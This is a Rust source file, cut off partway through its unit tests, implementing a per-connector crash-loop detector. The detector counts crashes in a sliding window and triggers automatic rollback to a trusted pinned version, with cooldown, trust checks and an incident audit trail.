//! bd-2yc4: Crash-loop detector with automatic rollback.
//!
//! Monitors connector crash frequency within a sliding window. When the
//! threshold is exceeded, triggers automatic rollback to a known-good
//! pinned version. Rollback targets must pass trust policy.

use std::collections::BTreeMap;

const DEFAULT_MAX_INCIDENTS: usize = 4096;
const MAX_CRASH_TIMESTAMPS_PER_CONNECTOR: usize = 128;

fn push_bounded<T>(items: &mut Vec<T>, item: T, cap: usize) {
    if cap == 0 {
        items.clear();
        return;
    }
    if items.len() >= cap {
        let overflow = items.len().saturating_sub(cap).saturating_add(1);
        items.drain(0..overflow);
    }
    items.push(item);
}

/// Configuration for crash-loop detection thresholds.
#[derive(Debug, Clone)]
pub struct CrashLoopConfig {
    /// Maximum crashes allowed within the sliding window.
    pub max_crashes: u32,
    /// Sliding window duration in seconds.
    pub window_secs: u64,
    /// Cooldown after rollback before re-detection activates.
    pub cooldown_secs: u64,
}

impl CrashLoopConfig {
    pub fn default_config() -> Self {
        Self {
            max_crashes: 5,
            window_secs: 300,
            cooldown_secs: 60,
        }
    }
}

/// A single crash event recorded by the detector.
#[derive(Debug, Clone)]
pub struct CrashEvent {
    pub connector_id: String,
    pub timestamp: String,
    pub reason: String,
}

/// A pinned known-good version to rollback to.
#[derive(Debug, Clone)]
pub struct KnownGoodPin {
    pub connector_id: String,
    pub version: String,
    pub pin_hash: String,
    pub trusted: bool,
}

/// The outcome of evaluating crash-loop state.
#[derive(Debug, Clone)]
pub struct RollbackDecision {
    pub connector_id: String,
    pub triggered: bool,
    pub crash_count: u32,
    pub window_secs: u64,
    pub rollback_target: Option<KnownGoodPin>,
    pub rollback_allowed: bool,
    pub reason: String,
    pub trace_id: String,
    pub timestamp: String,
}

/// Full incident record for audit trail.
#[derive(Debug, Clone)]
pub struct CrashLoopIncident {
    pub connector_id: String,
    pub crash_events: Vec<CrashEvent>,
    pub decision: RollbackDecision,
    pub trace_id: String,
}

/// Error codes for crash-loop detection.
///
/// - `CLD_THRESHOLD_EXCEEDED`
/// - `CLD_NO_KNOWN_GOOD`
/// - `CLD_PIN_UNTRUSTED`
/// - `CLD_COOLDOWN_ACTIVE`
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CrashLoopError {
    ThresholdExceeded {
        connector_id: String,
        count: u32,
        window_secs: u64,
    },
    NoKnownGood {
        connector_id: String,
    },
    PinUntrusted {
        connector_id: String,
        version: String,
    },
    PinConnectorMismatch {
        expected_connector: String,
        pin_connector: String,
    },
    CooldownActive {
        connector_id: String,
        remaining_secs: u64,
    },
}

impl CrashLoopError {
    pub fn code(&self) -> &'static str {
        match self {
            Self::ThresholdExceeded { .. } => "CLD_THRESHOLD_EXCEEDED",
            Self::NoKnownGood { .. } => "CLD_NO_KNOWN_GOOD",
            Self::PinUntrusted { .. } => "CLD_PIN_UNTRUSTED",
            Self::PinConnectorMismatch { .. } => "CLD_PIN_CONNECTOR_MISMATCH",
            Self::CooldownActive { .. } => "CLD_COOLDOWN_ACTIVE",
        }
    }
}

impl std::fmt::Display for CrashLoopError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::ThresholdExceeded {
                connector_id,
                count,
                window_secs,
            } => {
                write!(
                    f,
                    "CLD_THRESHOLD_EXCEEDED: {connector_id} crashed {count} times in {window_secs}s"
                )
            }
            Self::NoKnownGood { connector_id } => {
                write!(f, "CLD_NO_KNOWN_GOOD: no known-good pin for {connector_id}")
            }
            Self::PinUntrusted {
                connector_id,
                version,
            } => {
                write!(
                    f,
                    "CLD_PIN_UNTRUSTED: pin {version} for {connector_id} is untrusted"
                )
            }
            Self::PinConnectorMismatch {
                expected_connector,
                pin_connector,
            } => {
                write!(
                    f,
                    "CLD_PIN_CONNECTOR_MISMATCH: expected {expected_connector}, got pin for {pin_connector}"
                )
            }
            Self::CooldownActive {
                connector_id,
                remaining_secs,
            } => {
                write!(
                    f,
                    "CLD_COOLDOWN_ACTIVE: {connector_id} in cooldown for {remaining_secs}s"
                )
            }
        }
    }
}

/// Crash-loop detector maintaining sliding window state.
pub struct CrashLoopDetector {
    config: CrashLoopConfig,
    max_incidents: usize,
    /// Crash timestamps keyed by connector ID.
    crash_times_by_connector: BTreeMap<String, Vec<u64>>,
    /// Epoch second when last rollback occurred, keyed by connector ID.
    last_rollback_epoch_by_connector: BTreeMap<String, u64>,
    pub incidents: Vec<CrashLoopIncident>,
}

impl CrashLoopDetector {
    pub fn new(config: CrashLoopConfig) -> Self {
        Self::with_incident_capacity(config, DEFAULT_MAX_INCIDENTS)
    }

    pub fn with_incident_capacity(config: CrashLoopConfig, max_incidents: usize) -> Self {
        Self {
            config,
            max_incidents: max_incidents.max(1),
            crash_times_by_connector: BTreeMap::new(),
            last_rollback_epoch_by_connector: BTreeMap::new(),
            incidents: Vec::new(),
        }
    }

    fn push_incident(&mut self, incident: CrashLoopIncident) {
        let cap = self.max_incidents;
        push_bounded(&mut self.incidents, incident, cap);
    }

    /// Record a crash event. Returns the current crash count within the window.
    pub fn record_crash(&mut self, event: &CrashEvent, epoch_secs: u64) -> u32 {
        let connector_id = event.connector_id.clone();
        let times = self
            .crash_times_by_connector
            .entry(connector_id.clone())
            .or_default();
        // Prune timestamps outside the sliding window to bound memory.
        let cutoff = epoch_secs.saturating_sub(self.config.window_secs);
        times.retain(|&t| t >= cutoff);
        push_bounded(times, epoch_secs, MAX_CRASH_TIMESTAMPS_PER_CONNECTOR);
        self.crashes_in_window_for(&connector_id, epoch_secs)
    }

    /// Count crashes across all connectors within the sliding window ending at `now`.
    pub fn crashes_in_window(&self, now: u64) -> u32 {
        self.crash_times_by_connector.keys().fold(0_u32, |acc, id| {
            acc.saturating_add(self.crashes_in_window_for(id, now))
        })
    }

    /// Count crashes for a single connector within the sliding window ending at `now`.
    pub fn crashes_in_window_for(&self, connector_id: &str, now: u64) -> u32 {
        let cutoff = now.saturating_sub(self.config.window_secs);
        let count = self
            .crash_times_by_connector
            .get(connector_id)
            .map_or(0_usize, |times| {
                times.iter().filter(|&&t| t >= cutoff).count()
            });
        u32::try_from(count).unwrap_or(u32::MAX)
    }

    /// Check if the crash-loop threshold is exceeded for any connector at time `now`.
    pub fn is_looping(&self, now: u64) -> bool {
        self.crash_times_by_connector
            .keys()
            .any(|id| self.is_looping_for(id, now))
    }

    /// Check if the crash-loop threshold is exceeded for a connector at time `now`.
    pub fn is_looping_for(&self, connector_id: &str, now: u64) -> bool {
        self.crashes_in_window_for(connector_id, now) >= self.config.max_crashes
    }

    /// Check if any connector is still in cooldown at time `now`.
    pub fn in_cooldown(&self, now: u64) -> bool {
        self.last_rollback_epoch_by_connector
            .keys()
            .any(|id| self.in_cooldown_for(id, now))
    }

    /// Check if cooldown is still active for a connector at time `now`.
    pub fn in_cooldown_for(&self, connector_id: &str, now: u64) -> bool {
        let Some(last_rollback_epoch) = self.last_rollback_epoch_by_connector.get(connector_id)
        else {
            return false;
        };
        let cooldown_end = last_rollback_epoch.saturating_add(self.config.cooldown_secs);
        now <= cooldown_end
    }

    /// Remaining cooldown seconds across all connectors (0 if none in cooldown).
    pub fn cooldown_remaining(&self, now: u64) -> u64 {
        self.last_rollback_epoch_by_connector
            .keys()
            .map(|id| self.cooldown_remaining_for(id, now))
            .max()
            .unwrap_or(0)
    }

    /// Remaining cooldown seconds for a connector (0 if not in cooldown).
    pub fn cooldown_remaining_for(&self, connector_id: &str, now: u64) -> u64 {
        if !self.in_cooldown_for(connector_id, now) {
            return 0;
        }
        self.last_rollback_epoch_by_connector
            .get(connector_id)
            .map_or(0, |last_rollback_epoch| {
                last_rollback_epoch
                    .saturating_add(self.config.cooldown_secs)
                    .saturating_sub(now)
            })
    }

    /// Evaluate whether rollback should be triggered and produce a decision.
    ///
    /// INV-CLD-THRESHOLD: Only fires when threshold exceeded.
    /// INV-CLD-ROLLBACK-AUTO: Rollback is automatic when triggered.
    /// INV-CLD-TRUST-POLICY: Untrusted pins are rejected.
    /// INV-CLD-AUDIT: Every evaluation produces an incident record.
    pub fn evaluate(
        &mut self,
        connector_id: &str,
        crash_events: &[CrashEvent],
        pin: Option<&KnownGoodPin>,
        now: u64,
        trace_id: &str,
        timestamp: &str,
    ) -> Result<RollbackDecision, CrashLoopError> {
        let crash_count = self.crashes_in_window_for(connector_id, now);
        let connector_events: Vec<CrashEvent> = crash_events
            .iter()
            .filter(|event| event.connector_id == connector_id)
            .cloned()
            .collect();

        // INV-CLD-THRESHOLD: Only act if threshold exceeded
        if crash_count < self.config.max_crashes {
            let decision = RollbackDecision {
                connector_id: connector_id.to_string(),
                triggered: false,
                crash_count,
                window_secs: self.config.window_secs,
                rollback_target: None,
                rollback_allowed: false,
                reason: "below threshold".into(),
                trace_id: trace_id.to_string(),
                timestamp: timestamp.to_string(),
            };
            let incident = CrashLoopIncident {
                connector_id: connector_id.to_string(),
                crash_events: connector_events.clone(),
                decision: decision.clone(),
                trace_id: trace_id.to_string(),
            };
            self.push_incident(incident);
            return Ok(decision);
        }

        // Check cooldown
        if self.in_cooldown_for(connector_id, now) {
            let remaining = self.cooldown_remaining_for(connector_id, now);
            let decision = RollbackDecision {
                connector_id: connector_id.to_string(),
                triggered: true,
                crash_count,
                window_secs: self.config.window_secs,
                rollback_target: None,
                rollback_allowed: false,
                reason: format!("cooldown active, {remaining}s remaining"),
                trace_id: trace_id.to_string(),
                timestamp: timestamp.to_string(),
            };
            let incident = CrashLoopIncident {
                connector_id: connector_id.to_string(),
                crash_events: connector_events.clone(),
                decision: decision.clone(),
                trace_id: trace_id.to_string(),
            };
            self.push_incident(incident);
            return Err(CrashLoopError::CooldownActive {
                connector_id: connector_id.to_string(),
                remaining_secs: remaining,
            });
        }

        // INV-CLD-ROLLBACK-AUTO: must have a known-good pin
        let pin = match pin {
            Some(p) => p,
            None => {
                let decision = RollbackDecision {
                    connector_id: connector_id.to_string(),
                    triggered: true,
                    crash_count,
                    window_secs: self.config.window_secs,
                    rollback_target: None,
                    rollback_allowed: false,
                    reason: "no known-good pin available".into(),
                    trace_id: trace_id.to_string(),
                    timestamp: timestamp.to_string(),
                };
                let incident = CrashLoopIncident {
                    connector_id: connector_id.to_string(),
                    crash_events: connector_events.clone(),
                    decision: decision.clone(),
                    trace_id: trace_id.to_string(),
                };
                self.push_incident(incident);
                return Err(CrashLoopError::NoKnownGood {
                    connector_id: connector_id.to_string(),
                });
            }
        };

        if pin.connector_id != connector_id {
            let decision = RollbackDecision {
                connector_id: connector_id.to_string(),
                triggered: true,
                crash_count,
                window_secs: self.config.window_secs,
                rollback_target: Some(pin.clone()),
                rollback_allowed: false,
                reason: format!(
                    "known-good pin targets connector '{}', expected '{}'",
                    pin.connector_id, connector_id
                ),
                trace_id: trace_id.to_string(),
                timestamp: timestamp.to_string(),
            };
            let incident = CrashLoopIncident {
                connector_id: connector_id.to_string(),
                crash_events: connector_events.clone(),
                decision: decision.clone(),
                trace_id: trace_id.to_string(),
            };
            self.push_incident(incident);
            return Err(CrashLoopError::PinConnectorMismatch {
                expected_connector: connector_id.to_string(),
                pin_connector: pin.connector_id.clone(),
            });
        }

        // INV-CLD-TRUST-POLICY: rollback target must be trusted
        if !pin.trusted {
            let decision = RollbackDecision {
                connector_id: connector_id.to_string(),
                triggered: true,
                crash_count,
                window_secs: self.config.window_secs,
                rollback_target: Some(pin.clone()),
                rollback_allowed: false,
                reason: format!("pin {} is untrusted", pin.version),
                trace_id: trace_id.to_string(),
                timestamp: timestamp.to_string(),
            };
            let incident = CrashLoopIncident {
                connector_id: connector_id.to_string(),
                crash_events: connector_events.clone(),
                decision: decision.clone(),
                trace_id: trace_id.to_string(),
            };
            self.push_incident(incident);
            return Err(CrashLoopError::PinUntrusted {
                connector_id: connector_id.to_string(),
                version: pin.version.clone(),
            });
        }

        // All checks pass — automatic rollback
        self.last_rollback_epoch_by_connector
            .insert(connector_id.to_string(), now);
        // Clear only this connector's crash window after rollback.
        self.crash_times_by_connector.remove(connector_id);

        let decision = RollbackDecision {
            connector_id: connector_id.to_string(),
            triggered: true,
            crash_count,
            window_secs: self.config.window_secs,
            rollback_target: Some(pin.clone()),
            rollback_allowed: true,
            reason: format!("CLD_THRESHOLD_EXCEEDED: rolling back to {}", pin.version),
            trace_id: trace_id.to_string(),
            timestamp: timestamp.to_string(),
        };
        let incident = CrashLoopIncident {
            connector_id: connector_id.to_string(),
            crash_events: connector_events,
            decision: decision.clone(),
            trace_id: trace_id.to_string(),
        };
        self.push_incident(incident);
        Ok(decision)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config() -> CrashLoopConfig {
        CrashLoopConfig {
            max_crashes: 3,
            window_secs: 60,
            cooldown_secs: 30,
        }
    }

    fn crash(id: &str, ts: &str, reason: &str) -> CrashEvent {
        CrashEvent {
            connector_id: id.into(),
            timestamp: ts.into(),
            reason: reason.into(),
        }
    }

    fn trusted_pin() -> KnownGoodPin {
        KnownGoodPin {
            connector_id: "conn-1".into(),
            version: "1.0.0".into(),
            pin_hash: "abc123".into(),
            trusted: true,
        }
    }

    fn untrusted_pin() -> KnownGoodPin {
        KnownGoodPin {
            connector_id: "conn-1".into(),
            version: "0.9.0".into(),
            pin_hash: "bad000".into(),
            trusted: false,
        }
    }

    fn trusted_pin_for(id: &str) -> KnownGoodPin {
        KnownGoodPin {
            connector_id: id.into(),
            version: "1.0.0".into(),
            pin_hash: "abc123".into(),
            trusted: true,
        }
    }

    fn record_threshold_crashes(det: &mut CrashLoopDetector, connector_id: &str, start: u64) {
        for offset in 0..3 {
            let ev = crash(connector_id, "t", "oom");
            det.record_crash(&ev, start + offset);
        }
    }

    fn threshold_events(connector_id: &str) -> Vec<CrashEvent> {
        (0..3).map(|_| crash(connector_id, "t", "oom")).collect()
    }

    #[test]
    fn below_threshold_no_trigger() {
        let mut det = CrashLoopDetector::new(config());
        let ev = crash("conn-1", "t1", "oom");
        det.record_crash(&ev, 100);
        let result = det.evaluate("conn-1", &[ev], Some(&trusted_pin()), 100, "tr1", "ts1");
        let decision = result.expect("should evaluate");
        assert!(!decision.triggered);
        assert_eq!(decision.crash_count, 1);
    }

    #[test]
    fn at_threshold_triggers_rollback() {
        let mut det = CrashLoopDetector::new(config());
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom");
            det.record_crash(&ev, 100 + i);
        }
        let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
        let result = det.evaluate("conn-1", &events, Some(&trusted_pin()), 102, "tr1", "ts1");
        let decision = result.expect("should evaluate");
        assert!(decision.triggered);
        assert!(decision.rollback_allowed);
        assert_eq!(decision.crash_count, 3);
    }

    #[test]
    fn no_known_good_errors() {
        let mut det = CrashLoopDetector::new(config());
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom");
            det.record_crash(&ev, 100 + i);
        }
        let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
        let result = det.evaluate("conn-1", &events, None, 102, "tr1", "ts1");
        let err = result.unwrap_err();
        assert_eq!(err.code(), "CLD_NO_KNOWN_GOOD");
    }

    #[test]
    fn untrusted_pin_rejected() {
        let mut det = CrashLoopDetector::new(config());
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom");
            det.record_crash(&ev, 100 + i);
        }
        let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
        let result = det.evaluate("conn-1", &events, Some(&untrusted_pin()), 102, "tr1", "ts1");
        let err = result.unwrap_err();
        assert_eq!(err.code(), "CLD_PIN_UNTRUSTED");
    }

    #[test]
    fn cooldown_prevents_retrigger() {
        let mut det = CrashLoopDetector::new(config());
        // First loop: trigger rollback
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom");
            det.record_crash(&ev, 100 + i);
        }
        let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
        let result = det.evaluate("conn-1", &events, Some(&trusted_pin()), 102, "tr1", "ts1");
        assert!(result.unwrap().rollback_allowed);

        // Second loop within cooldown
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom again");
            det.record_crash(&ev, 110 + i);
        }
        let events2: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom again")).collect();
        let result2 = det.evaluate("conn-1", &events2, Some(&trusted_pin()), 112, "tr2", "ts2");
        let err = result2.unwrap_err();
        assert_eq!(err.code(), "CLD_COOLDOWN_ACTIVE");
    }

    #[test]
    fn cooldown_expires_allows_retrigger() {
        let mut det = CrashLoopDetector::new(config());
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom");
            det.record_crash(&ev, 100 + i);
        }
        let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
        det.evaluate("conn-1", &events, Some(&trusted_pin()), 102, "tr1", "ts1")
            .unwrap();

        // After cooldown
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom again");
            det.record_crash(&ev, 200 + i);
        }
        let events2: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom again")).collect();
        let result = det.evaluate("conn-1", &events2, Some(&trusted_pin()), 202, "tr2", "ts2");
        let decision = result.expect("should evaluate");
        assert!(decision.triggered);
        assert!(decision.rollback_allowed);
    }

    #[test]
    fn sliding_window_excludes_old_crashes() {
        let mut det = CrashLoopDetector::new(config());
        // Old crashes outside window
        for i in 0..3 {
            let ev = crash("conn-1", "t", "old");
            det.record_crash(&ev, i);
        }
        // Now = 1000, window = 60s, old crashes at 0-2 are outside
        assert!(!det.is_looping(1000));
        assert_eq!(det.crashes_in_window(1000), 0);
    }

    #[test]
    fn record_crash_returns_count() {
        let mut det = CrashLoopDetector::new(config());
        let ev = crash("conn-1", "t", "oom");
        assert_eq!(det.record_crash(&ev, 100), 1);
        assert_eq!(det.record_crash(&ev, 101), 2);
        assert_eq!(det.record_crash(&ev, 102), 3);
    }

    #[test]
    fn record_crash_bounds_per_connector_timestamps_fifo() {
        let mut det = CrashLoopDetector::new(CrashLoopConfig {
            max_crashes: 3,
            window_secs: u64::MAX,
            cooldown_secs: 30,
        });
        let event = crash("conn-bounded", "t", "oom");

        for epoch_secs in 0..200 {
            det.record_crash(&event, epoch_secs);
        }

        let times = det
            .crash_times_by_connector
            .get("conn-bounded")
            .expect("connector crash timestamps should exist");
        assert_eq!(times.len(), MAX_CRASH_TIMESTAMPS_PER_CONNECTOR);
        assert_eq!(times.first(), Some(&72));
        assert_eq!(times.last(), Some(&199));
        assert!(times.windows(2).all(|pair| pair[0] < pair[1]));
        assert_eq!(
            det.crashes_in_window_for("conn-bounded", 199),
            u32::try_from(MAX_CRASH_TIMESTAMPS_PER_CONNECTOR).unwrap()
        );
    }

    #[test]
    fn incident_audit_trail() {
        let mut det = CrashLoopDetector::new(config());
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom");
            det.record_crash(&ev, 100 + i);
        }
        let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
        det.evaluate("conn-1", &events, Some(&trusted_pin()), 102, "tr1", "ts1")
            .unwrap();
        assert_eq!(det.incidents.len(), 1);
        assert_eq!(det.incidents[0].trace_id, "tr1");
    }

    #[test]
    fn incident_audit_trail_retains_history_across_rollbacks() {
        let mut det = CrashLoopDetector::new(config());

        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom-1");
            det.record_crash(&ev, 100 + i);
        }
        let events1: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom-1")).collect();
        let first = det
            .evaluate("conn-1", &events1, Some(&trusted_pin()), 102, "tr1", "ts1")
            .expect("first rollback should succeed");
        assert!(first.rollback_allowed);
        assert_eq!(det.incidents.len(), 1);

        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom-2");
            det.record_crash(&ev, 200 + i);
        }
        let events2: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom-2")).collect();
        let second = det
            .evaluate("conn-1", &events2, Some(&trusted_pin()), 202, "tr2", "ts2")
            .expect("second rollback should succeed");
        assert!(second.rollback_allowed);

        assert_eq!(det.incidents.len(), 2);
        assert_eq!(det.incidents[0].trace_id, "tr1");
        assert_eq!(det.incidents[1].trace_id, "tr2");
    }

    #[test]
    fn rollback_clears_crash_window() {
        let mut det = CrashLoopDetector::new(config());
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom");
            det.record_crash(&ev, 100 + i);
        }
        let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
        det.evaluate("conn-1", &events, Some(&trusted_pin()), 102, "tr1", "ts1")
            .unwrap();
        // After rollback, crash window should be cleared
        assert_eq!(det.crashes_in_window_for("conn-1", 103), 0);
    }

    #[test]
    fn default_config_values() {
        let c = CrashLoopConfig::default_config();
        assert_eq!(c.max_crashes, 5);
        assert_eq!(c.window_secs, 300);
        assert_eq!(c.cooldown_secs, 60);
    }

    #[test]
    fn error_display() {
        let e = CrashLoopError::ThresholdExceeded {
            connector_id: "c1".into(),
            count: 5,
            window_secs: 60,
        };
        assert!(e.to_string().contains("CLD_THRESHOLD_EXCEEDED"));
        assert!(e.to_string().contains("c1"));
    }

    #[test]
    fn error_codes_all_present() {
        assert_eq!(
            CrashLoopError::ThresholdExceeded {
                connector_id: "x".into(),
                count: 0,
                window_secs: 0
            }
            .code(),
            "CLD_THRESHOLD_EXCEEDED"
        );
        assert_eq!(
            CrashLoopError::NoKnownGood {
                connector_id: "x".into()
            }
            .code(),
            "CLD_NO_KNOWN_GOOD"
        );
        assert_eq!(
            CrashLoopError::PinUntrusted {
                connector_id: "x".into(),
                version: "v".into()
            }
            .code(),
            "CLD_PIN_UNTRUSTED"
        );
        assert_eq!(
            CrashLoopError::PinConnectorMismatch {
                expected_connector: "x".into(),
                pin_connector: "y".into()
            }
            .code(),
            "CLD_PIN_CONNECTOR_MISMATCH"
        );
        assert_eq!(
            CrashLoopError::CooldownActive {
                connector_id: "x".into(),
                remaining_secs: 10
            }
            .code(),
            "CLD_COOLDOWN_ACTIVE"
        );
    }

    #[test]
    fn in_cooldown_false_initially() {
        let det = CrashLoopDetector::new(config());
        assert!(!det.in_cooldown(100));
    }

    #[test]
    fn cooldown_remaining_zero_initially() {
        let det = CrashLoopDetector::new(config());
        assert_eq!(det.cooldown_remaining(100), 0);
    }

    #[test]
    fn rollback_decision_has_target() {
        let mut det = CrashLoopDetector::new(config());
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom");
            det.record_crash(&ev, 100 + i);
        }
        let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
        let decision = det
            .evaluate("conn-1", &events, Some(&trusted_pin()), 102, "tr1", "ts1")
            .unwrap();
        assert!(decision.rollback_target.is_some());
        assert_eq!(decision.rollback_target.unwrap().version, "1.0.0");
    }

    #[test]
    fn cooldown_active_at_exact_boundary() {
        let mut det = CrashLoopDetector::new(config());
        // Record enough crashes to trigger rollback
        for i in 0..3 {
            let ev = crash("conn-1", "t", "oom");
            det.record_crash(&ev, 100 + i);
        }
        // Trigger rollback at epoch 102
        let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
        let _ = det.evaluate("conn-1", &events, Some(&trusted_pin()), 102, "tr1", "ts1");
        // Cooldown is 30 secs: epoch 102 + 30 = 132.
        // At exactly 132, cooldown must still be active (fail-closed).
        assert!(
            det.in_cooldown_for("conn-1", 132),
            "cooldown must still be active at exact boundary"
        );
        // One second later, cooldown expires.
        assert!(!det.in_cooldown_for("conn-1", 133));
    }

    #[test]
    fn cooldown_math_saturates_near_u64_max() {
        let mut det = CrashLoopDetector::new(CrashLoopConfig {
            max_crashes: 1,
            window_secs: 1,
            cooldown_secs: 10,
        });
        det.last_rollback_epoch_by_connector
            .insert("conn-1".to_string(), u64::MAX - 5);

        // With saturating arithmetic, deadline clamps at u64::MAX.
        assert!(det.in_cooldown_for("conn-1", u64::MAX));
        assert_eq!(det.cooldown_remaining_for("conn-1", u64::MAX), 0);
        assert_eq!(det.cooldown_remaining_for("conn-1", u64::MAX - 2), 2);
    }

    #[test]
    fn crashes_are_isolated_per_connector() {
        let mut det = CrashLoopDetector::new(config());

        for i in 0..3 {
            let ev = crash("conn-a", "t", "oom-a");
            det.record_crash(&ev, 100 + i);
        }

        let ev_b = crash("conn-b", "t", "oom-b");
        det.record_crash(&ev_b, 102);

        let outcome_b = det
            .evaluate(
                "conn-b",
                std::slice::from_ref(&ev_b),
                Some(&trusted_pin()),
                102,
                "tr-b",
                "ts-b",
            )
            .unwrap();
        assert!(!outcome_b.triggered);
        assert_eq!(outcome_b.crash_count, 1);
    }

    #[test]
    fn pin_connector_mismatch_rejected() {
        let mut det = CrashLoopDetector::new(config());
        for i in 0..3 {
            let ev = crash("conn-a", "t", "oom-a");
            det.record_crash(&ev, 100 + i);
        }

        let events: Vec<_> = (0..3).map(|_| crash("conn-a", "t", "oom-a")).collect();
        let err = det
            .evaluate(
                "conn-a",
                &events,
                Some(&trusted_pin_for("conn-b")),
                102,
                "tr-a",
                "ts-a",
            )
            .unwrap_err();
        assert_eq!(err.code(), "CLD_PIN_CONNECTOR_MISMATCH");
    }

    #[test]
    fn incidents_only_include_target_connector_events() {
        let mut det = CrashLoopDetector::new(config());
        for i in 0..3 {
            let ev = crash("conn-a", "t", "oom-a");
            det.record_crash(&ev, 100 + i);
        }

        let mixed_events = vec![
            crash("conn-a", "t1", "oom-a"),
            crash("conn-b", "t2", "oom-b"),
        ];
        let _ = det
            .evaluate(
                "conn-a",
                &mixed_events,
                Some(&trusted_pin_for("conn-a")),
                102,
                "tr-a",
                "ts-a",
            )
            .unwrap();
        assert_eq!(det.incidents.len(), 1);
        assert_eq!(det.incidents[0].crash_events.len(), 1);
        assert_eq!(det.incidents[0].crash_events[0].connector_id, "conn-a");
    }

    #[test]
    fn rollback_clears_only_target_connector_window() {
        let mut det = CrashLoopDetector::new(config());

        for i in 0..3 {
            let ev = crash("conn-a", "t", "oom-a");
            det.record_crash(&ev, 100 + i);
        }
        for i in 0..2 {
            let ev = crash("conn-b", "t", "oom-b");
            det.record_crash(&ev, 100 + i);
        }

        let events_a: Vec<_> = (0..3).map(|_| crash("conn-a", "t", "oom-a")).collect();
        det.evaluate(
            "conn-a",
            &events_a,
            Some(&trusted_pin_for("conn-a")),
            102,
            "tr-a",
            "ts-a",
        )
        .unwrap();

        assert_eq!(det.crashes_in_window_for("conn-a", 102), 0);
        assert_eq!(det.crashes_in_window_for("conn-b", 102), 2);
    }

    #[test]
    fn incident_capacity_clamps_to_one() {
        let mut det = CrashLoopDetector::with_incident_capacity(config(), 0);

        for idx in 0..2 {
            for offset in 0..3 {
                let ev = crash("conn-1", "t", "oom");
                det.record_crash(&ev, 100 + (idx * 100) + offset);
            }
            let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
            det.evaluate(
                "conn-1",
                &events,
                Some(&trusted_pin()),
                102 + (idx * 100),
                &format!("tr{idx}"),
                "ts",
            )
            .unwrap();
        }

        assert_eq!(det.incidents.len(), 1);
        assert_eq!(det.incidents[0].trace_id, "tr1");
    }

    #[test]
    fn incident_history_evicts_oldest_first() {
        let mut det = CrashLoopDetector::with_incident_capacity(config(), 2);

        for idx in 0..3 {
            for offset in 0..3 {
                let ev = crash("conn-1", "t", "oom");
                det.record_crash(&ev, 100 + (idx * 100) + offset);
            }
            let events: Vec<_> = (0..3).map(|_| crash("conn-1", "t", "oom")).collect();
            det.evaluate(
                "conn-1",
                &events,
                Some(&trusted_pin()),
                102 + (idx * 100),
                &format!("tr{idx}"),
                "ts",
            )
            .unwrap();
        }

        assert_eq!(det.incidents.len(), 2);
        assert_eq!(det.incidents[0].trace_id, "tr1");
        assert_eq!(det.incidents[1].trace_id, "tr2");
    }

    #[test]
    fn no_known_good_denial_records_incident_without_clearing_window() {
        let mut det = CrashLoopDetector::new(config());
        record_threshold_crashes(&mut det, "conn-deny", 100);
        let events = threshold_events("conn-deny");

        let err = det
            .evaluate("conn-deny", &events, None, 102, "tr-deny", "ts-deny")
            .unwrap_err();

        assert!(matches!(err, CrashLoopError::NoKnownGood { .. }));
        assert_eq!(det.crashes_in_window_for("conn-deny", 102), 3);
        assert_eq!(det.incidents.len(), 1);
        assert_eq!(det.incidents[0].trace_id, "tr-deny");
        assert!(!det.incidents[0].decision.rollback_allowed);
        assert!(det.incidents[0].decision.rollback_target.is_none());
    }

    #[test]
    fn untrusted_pin_denial_records_incident_without_clearing_window() {
        let mut det = CrashLoopDetector::new(config());
        record_threshold_crashes(&mut det, "conn-1", 100);
        let events = threshold_events("conn-1");

        let err = det
            .evaluate(
                "conn-1",
                &events,
                Some(&untrusted_pin()),
                102,
                "tr-untrusted",
                "ts-untrusted",
            )
            .unwrap_err();

        assert!(matches!(err, CrashLoopError::PinUntrusted { .. }));
        assert_eq!(det.crashes_in_window_for("conn-1", 102), 3);
        assert_eq!(det.incidents.len(), 1);
        assert!(!det.incidents[0].decision.rollback_allowed);
        assert!(det.incidents[0].decision.reason.contains("is untrusted"));
    }

    #[test]
    fn connector_mismatch_denial_keeps_target_crashes_for_retry() {
        let mut det = CrashLoopDetector::new(config());
        record_threshold_crashes(&mut det, "conn-a", 100);
        let events = threshold_events("conn-a");

        let err = det
            .evaluate(
                "conn-a",
                &events,
                Some(&trusted_pin_for("conn-b")),
                102,
                "tr-mismatch",
                "ts-mismatch",
            )
            .unwrap_err();

        assert!(matches!(
            err,
            CrashLoopError::PinConnectorMismatch {
                expected_connector,
                pin_connector
            } if expected_connector == "conn-a" && pin_connector == "conn-b"
        ));
        assert_eq!(det.crashes_in_window_for("conn-a", 102), 3);
        assert_eq!(det.incidents.len(), 1);
        assert!(!det.incidents[0].decision.rollback_allowed);
        assert!(
            det.incidents[0]
                .decision
                .rollback_target
                .as_ref()
